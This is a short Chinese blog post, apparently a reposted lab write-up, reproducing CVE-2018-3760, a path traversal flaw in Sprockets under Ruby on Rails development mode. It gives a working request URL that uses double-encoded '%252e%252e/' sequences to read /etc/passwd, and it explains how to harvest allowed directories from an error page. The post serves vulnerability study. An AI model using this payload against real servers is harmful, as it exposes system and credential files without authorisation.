# Ruby On Rails 路径穿越漏洞（CVE-2018-3760） - 暮日温柔 - 博客园

> 原文：[`www.cnblogs.com/daiorz/p/11713277.html`](https://www.cnblogs.com/daiorz/p/11713277.html)

Ruby On Rails 在开发环境下使用 Sprockets 作为静态文件服务器，Ruby On Rails 是著名 Ruby Web 开发框架，Sprockets 是编译及分发静态资源文件的 Ruby 库。

Sprockets 3.7.1 及之前版本中，存在一处因为二次解码导致的路径穿越漏洞，攻击者可以利用%252e%252e/来跨越到根目录，读取或执行目标服务器上任意文件。

## 漏洞复现

直接访问`http://your-ip:3000/assets/file:%2f%2f/etc/passwd`，将会报错，因为文件`/etc/passwd`不在允许的目录中。

我们通过报错页面，可以获得允许的目录列表。随便选择其中一个目录，如`/usr/src/blog/app/assets/images`，然后使用`%252e%252e/`向上一层跳转，最后读取`/etc/passwd`：

```
**`assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd`** 
```